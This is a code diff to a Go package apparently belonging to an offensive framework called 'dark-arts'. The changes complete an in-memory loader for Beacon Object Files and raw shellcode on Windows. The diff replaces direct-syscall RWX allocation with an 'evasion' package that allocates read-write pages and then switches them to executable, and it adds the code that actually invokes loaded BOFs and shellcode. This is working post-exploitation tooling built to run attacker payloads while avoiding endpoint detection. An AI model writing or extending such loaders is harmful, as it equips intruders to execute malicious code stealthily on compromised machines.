@@ -1,4 +1,4 @@
-//go:build windows
+//go:build windows && amd64
 
 package bof
 
@@ -7,11 +7,10 @@ import (
 	"encoding/binary"
 	"errors"
 	"fmt"
-	"syscall"
 	"unsafe"
 
+	"dark-arts/pkg/evasion"
 	"dark-arts/pkg/reflective"
-	"dark-arts/pkg/sleepmask"
 )
 
 type COFF struct {
@@ -22,11 +21,12 @@ type COFF struct {
 }
 
 type Section struct {
-	Name     string
-	Virtual  uint64
-	Physical []byte
-	Relocs   []Reloc
-	Flags    uint32
+	Name       string
+	Virtual    uint64
+	VirtualSize uint64
+	Physical   []byte
+	Relocs     []Reloc
+	Flags      uint32
 }
 
 type Reloc struct {
@@ -159,10 +159,11 @@ func ParseCOFF(data []byte) (*COFF, error) {
 	for i := uint16(0); i < numSections; i++ {
 		h := sectionHeaders[i]
 		sec := &Section{
-			Name:     h.Name,
-			Virtual:  uint64(h.VirtualAddress),
-			Physical: sectionData[i],
-			Flags:    h.Characteristics,
+			Name:       h.Name,
+			Virtual:    uint64(h.VirtualAddress),
+			VirtualSize: uint64(h.VirtualSize),
+			Physical:   sectionData[i],
+			Flags:      h.Characteristics,
 		}
 
 		if h.NumberOfRelocations > 0 && h.PointerToRelocations > 0 {
@@ -220,7 +221,7 @@ func ParseCOFF(data []byte) (*COFF, error) {
 }
 
 // Load allocates memory, copies sections, applies relocations,
-// and registers with sleep mask.
+// and sets page protections using Windows API.
 func (c *COFF) Load() (uintptr, error) {
 	var maxAddr uint64
 	for _, s := range c.Sections {
@@ -233,7 +234,15 @@ func (c *COFF) Load() (uintptr, error) {
 		return 0, errors.New("bof: no sections to load")
 	}
 
-	base, err := syscallAlloc(uintptr(maxAddr))
+	// Round up to page size (4KB), minimum 64KB
+	pageSize := uintptr(4096)
+	allocSize := (uintptr(maxAddr) + pageSize - 1) &^ (pageSize - 1)
+	if allocSize < 65536 {
+		allocSize = 65536
+	}
+
+	// Allocate RW memory using evasion package (like reflective loader)
+	base, err := evasion.AllocateVirtualMemory(evasion.CurrentProcess, allocSize, 0x04) // PAGE_READWRITE
 	if err != nil {
 		return 0, fmt.Errorf("bof: alloc failed: %w", err)
 	}
@@ -269,13 +278,15 @@ func (c *COFF) Load() (uintptr, error) {
 		}
 	}
 
-	if err := syscallProtect(base, uintptr(maxAddr), 0x40); err != nil { // PAGE_EXECUTE_READWRITE
-		return 0, fmt.Errorf("bof: protect failed: %w", err)
+	// Change protection to RX for executable sections only (like reflective loader)
+	const IMAGE_SCN_MEM_EXECUTE = 0x20000000
+	for _, s := range c.Sections {
+		if len(s.Physical) > 0 && (s.Flags&0x20000000) != 0 {
+			if _, err := evasion.ProtectVirtualMemory(evasion.CurrentProcess, base+uintptr(s.Virtual), uintptr(len(s.Physical)), 0x20); err != nil {
+				return 0, fmt.Errorf("bof: protect failed: %w", err)
+			}
+		}
 	}
-
-	// Register with sleep mask
-	// Note: sleepmask.MaskSelfRegion expects (ptr, size, prot)
-	// sleepmask.MaskSelfRegion(base, maxAddr, 0x40)
 
 	return base + uintptr(c.Entry), nil
 }
@@ -289,6 +300,8 @@ func (c *COFF) GetSymbol(name string) (uintptr, bool) {
 }
 
 // ExecuteCOFF loads and executes a BOF (COFF object file) in-memory.
+// The BOF entry point should follow the convention: void go(char *args, int length)
+// args is a packed buffer, length is the buffer size.
 func ExecuteCOFF(coffBytes []byte, functionName string, args []string) (string, error) {
 	coff, err := ParseCOFF(coffBytes)
 	if err != nil {
@@ -305,7 +318,20 @@ func ExecuteCOFF(coffBytes []byte, functionName string, args []string) (string, 
 		fnAddr = entry
 	}
 
-	return fmt.Sprintf("coff loaded at 0x%x, function %s at 0x%x (execution not yet implemented)", entry, functionName, fnAddr), nil
+	// Pack arguments into BOF format
+	packedArgs := PackArguments(args)
+	var argPtr uintptr
+	argLen := len(packedArgs)
+	if argLen > 0 {
+		argPtr = uintptr(unsafe.Pointer(&packedArgs[0]))
+	} else {
+		argPtr = 0
+	}
+
+	// Call the BOF entry point using assembly stub: void go(char *args, int length)
+	_ = CallFunc2(fnAddr, argPtr, uintptr(argLen))
+
+	return fmt.Sprintf("BOF %s executed at 0x%x", functionName, fnAddr), nil
 }
 
 // ExecuteAssembly loads and executes a .NET assembly in-memory via CLR hosting.
@@ -328,56 +354,24 @@ func ExecuteShellcode(shellcode []byte) (string, error) {
 		return "", errors.New("bof: empty shellcode")
 	}
 
-	base, err := syscallAlloc(uintptr(len(shellcode)))
+	pageSize := uintptr(4096)
+	allocSize := (uintptr(len(shellcode)) + pageSize - 1) &^ (pageSize - 1)
+	if allocSize < 65536 {
+		allocSize = 65536
+	}
+
+	base, err := evasion.AllocateVirtualMemory(evasion.CurrentProcess, allocSize, 0x04) // PAGE_READWRITE
 	if err != nil {
 		return "", fmt.Errorf("bof: alloc failed: %w", err)
 	}
 
 	copy((*[1<<30]byte)(unsafe.Pointer(base))[:], shellcode)
 
-	if err := syscallProtect(base, uintptr(len(shellcode)), 0x40); err != nil {
+	if _, err := evasion.ProtectVirtualMemory(evasion.CurrentProcess, base, uintptr(len(shellcode)), 0x20); err != nil {
 		return "", fmt.Errorf("bof: protect failed: %w", err)
 	}
 
-	sleepmask.MaskSelfRegion(base, uintptr(len(shellcode)), 0x40)
-
-	_, _, _ = syscall.Syscall(base, 0, 0, 0, 0)
+	CallFunc0(base)
 
 	return fmt.Sprintf("shellcode executed at 0x%x", base), nil
-}
-
-// syscallAlloc allocates RWX memory via NtAllocateVirtualMemory
-func syscallAlloc(size uintptr) (uintptr, error) {
-	var base uintptr
-
-	r1, _, _ := syscall.Syscall6(
-		0x18, // NtAllocateVirtualMemory SSN
-		6,
-		0xFFFFFFFFFFFFFFFF,       // CurrentProcess
-		uintptr(unsafe.Pointer(&base)),
-		0,
-		uintptr(unsafe.Pointer(&size)),
-		0x3000, // MEM_COMMIT | MEM_RESERVE
-		0x40,   // PAGE_EXECUTE_READWRITE
-	)
-	if r1 != 0 {
-		return 0, fmt.Errorf("NtAllocateVirtualMemory failed: 0x%X", r1)
-	}
-	return base, nil
-}
-
-func syscallProtect(base uintptr, size uintptr, prot uint32) error {
-	r1, _, _ := syscall.Syscall6(
-		0x50, // NtProtectVirtualMemory SSN
-		5,
-		0xFFFFFFFFFFFFFFFF,
-		uintptr(unsafe.Pointer(&base)),
-		uintptr(unsafe.Pointer(&size)),
-		uintptr(prot),
-		0, 0,
-	)
-	if r1 != 0 {
-		return fmt.Errorf("NtProtectVirtualMemory failed: 0x%X", r1)
-	}
-	return nil
 }
